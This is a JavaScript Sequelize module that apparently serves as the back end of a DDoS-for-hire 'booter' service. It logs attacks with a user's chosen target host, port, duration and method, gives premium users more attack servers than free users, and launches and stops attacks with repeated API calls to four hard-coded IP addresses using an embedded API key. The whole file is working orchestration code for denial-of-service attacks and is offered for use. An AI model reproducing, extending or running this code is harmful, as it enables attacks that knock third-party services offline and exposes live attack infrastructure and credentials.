let DataTypes = require('sequelize');
let sequelize = require('../sequelize');
let request = require('request');

let Attacks = sequelize.define('attacks', {
    ID: {
        type: DataTypes.INTEGER,
        allowNull: true,
        primaryKey: true
    },
    host: {
        type: DataTypes.STRING,
        allowNull: false,
    },
    port: {
        type: DataTypes.INTEGER,
        allowNull: false
    },
    time: {
        type: DataTypes.INTEGER,
        allowNull: false
    },
    method: {
        type: DataTypes.STRING,
        allowNull: false
    },
    username: {
        type: DataTypes.STRING,
        allowNull: false
    },
    status: {
        type: DataTypes.STRING,
        allowNull: true
    },
    expire: {
        type: DataTypes.INTEGER,
        allowNull: false
    }
}, {
    freezeTableName: true,
    timestamps: false
})

let log = (host, port, time, method, username) => {
    let timestamp = Math.round(new Date().getTime() / 1000);
    let end = timestamp += parseInt(time);

    return new Promise((resolve, reject) => {
        Attacks.create({
            host: host,
            port: port,
            time: time,
            method: method,
            username: username,
            expire: end
        }).then(data => {
            if (data) {
                resolve('logged')
            }
        }).catch(err => reject(err));
    })
}

let count = () => {
    return new Promise((resolve, reject) => {
        Attacks.findAll().then(data => {
            if (data) {
                resolve(data.length)
            }
        }).catch(err => {
            reject(err);
        })
    })
}

let isRunning = (username) => {
    return new Promise((resolve, reject) => {
        Attacks.findOne({
            where: {
                username: username,
                status: "Running"
            }
        }).then(data => {
            if (data) {
                resolve(true);
            } else {
                resolve(false);
            }
        }).catch(err => {
            reject(err);
        })
    })
}

let requestApiPremium = (host, port, time, method, username) => {
    return new Promise((resolve, reject) => {
        for (let i = 0; i < 3; i++) {
            request.get(`http://69.30.211.194/api.php?method=${method}&key=Runescapex@1&host=${host}&time=${time}&port=${port}&user=${username}`, {
                headers: {
                    gzip: true
                }
            }, (error, response, body) => {
                if (response.statusCode == 200) {
                    resolve("Sent");
                }
            });
            request.get(`http://176.126.175.139/api.php?method=${method}&key=Runescapex@1&host=${host}&time=${time}&port=${port}&user=${username}`, {
                headers: {
                    gzip: true
                }
            }, (error, response, body) => {
                if (response.statusCode == 200) {
                    resolve("Sent");
                }
            });
            request.get(`http://176.126.175.130/api.php?method=${method}&key=Runescapex@1&host=${host}&time=${time}&port=${port}&user=${username}`, {
                headers: {
                    gzip: true
                }
            }, (error, response, body) => {
                if (response.statusCode == 200) {
                    resolve("Sent");
                }
            });
            request.get(`http://176.126.175.136/api.php?method=${method}&key=Runescapex@1&host=${host}&time=${time}&port=${port}&user=${username}`, {
                headers: {
                    gzip: true
                }
            }, (error, response, body) => {
                if (response.statusCode == 200) {
                    resolve("Sent");
                }
            });
        }
    })
}

let setFinished = (username) => {
    return new Promise((resolve, reject) => {
        Attacks.update(({
            status: "Finished"
        }), {
            where: {
                username: username
            }
        }).then(data => {
            resolve('finished');
        })
    })
}

let userStop = async (username) => {
    await setFinished(username);
    return new Promise((resolve, reject) => {
        request.get(`http://69.30.211.194/api.php?method=stop&key=Runescapex@1&user=${username}`, {
            headers: {
                gzip: true
            }
        }, (error, response, body) => {
            if (response.statusCode == 200) {
                resolve("stopped");
            }
        });
        request.get(`http://176.126.175.139/api.php?method=stop&key=Runescapex@1&user=${username}`, {
            headers: {
                gzip: true
            }
        }, (error, response, body) => {
            if (response.statusCode == 200) {
                resolve("stopped");
            }
        });
        request.get(`http://176.126.175.130/api.php?method=stop&key=Runescapex@1&user=${username}`, {
            headers: {
                gzip: true
            }
        }, (error, response, body) => {
            if (response.statusCode == 200) {
                resolve("stopped");
            }
        });
        request.get(`http://176.126.175.136/api.php?method=stop&key=Runescapex@1&user=${username}`, {
            headers: {
                gzip: true
            }
        }, (error, response, body) => {
            if (response.statusCode == 200) {
                resolve("stopped");
            }
        });
    })
}

let requestFreeApi = (host, port, time, method, username) => {
    return new Promise((resolve, reject) => {
        for (let i = 0; i < 3; i++) {
            request.get(`http://176.126.175.130/api.php?method=${method}&key=Runescapex@1&host=${host}&time=${time}&port=${port}&user=${username}`, {
                headers: {
                    gzip: true
                }
            }, (error, response, body) => {
                if (response.statusCode == 200) {
                    resolve("Sent");
                }
            });
            request.get(`http://176.126.175.136/api.php?method=${method}&key=Runescapex@1&host=${host}&time=${time}&port=${port}&user=${username}`, {
                headers: {
                    gzip: true
                }
            }, (error, response, body) => {
                if (response.statusCode == 200) {
                    resolve("Sent");
                }
            });
        }
    })
}

let stopAttack = () => {
    let current = Math.round(new Date().getTime() / 1000);

    return new Promise((resolve, reject) => {
        Attacks.findAll({
            where: {
                status: "Running"
            }
        }).then(async data => {
            for(let i = 0; i < data.length; i++) {
                let expire = data[i].dataValues.expire;
                let ID = data[i].dataValues.ID;

                if (current > expire) {
                    Attacks.update({
                        status: "Finished"
                    }, {
                        where: {
                            ID: ID
                        }
                    }).then(data => {
                        console.log(data);
                    })
                }
            }
        })
    })
}

let getAllRunningUser = (username) => {
    return new Promise((resolve, reject) => {
        Attacks.findAll({
            where: {
                username: username,
                status: "Running"
            }
        }).then(data => {
            resolve(data.length);
        })
    })
}

let getAllRunning = () => {
    return new Promise((resolve, reject) => {
        Attacks.findAll({
            where: {
                status: "Running"
            }
        }).then(data => {
            resolve(data.length);
        })
    })
}

let getRunningUser = (username) => {
    return new Promise((resolve, reject) => {
        Attacks.findOne({
            where: {
                username: username,
                status: "Running"
            }
        }).then(data => {
            if (data) {
                resolve(data);
            } else {
                resolve(false);
            }
        })
    })
}

let getAllUser = (username) => {
    return new Promise((resolve, reject) => {
        Attacks.findAll({
            where: {
                username: username,
                status: "Finished"
            }
        }).then(data => {
            resolve(data);
        }).catch(err => {
            reject(err);
        })
    })
}

module.exports = {
    count: () => {
        return count();
    },
    isRunning: (username) => {
        return isRunning(username);
    },
    getAllUser: (username) => {
        return getAllUser(username);
    },
    stopAttack: () => {
        return stopAttack();
    },
    log: (host, port, time, method, username) => {
        return log(host, port, time, method, username);
    },
    requestApiPremium: (host, port, time, method, username) => {
        return requestApiPremium(host, port, time, method, username);
    },
    requestFreeApi: (host, port, time, method, username) => {
        return requestFreeApi(host, port, time, method, username)
    },
    getAllRunningUser: (username) => {
      return getAllRunningUser(username);
    },
    getAllRunning: () => {
        return getAllRunning();
    },
    getRunningUser: (username) => {
        return getRunningUser(username);
    },
    userStop: (username) => {
        return userStop(username);
    }
}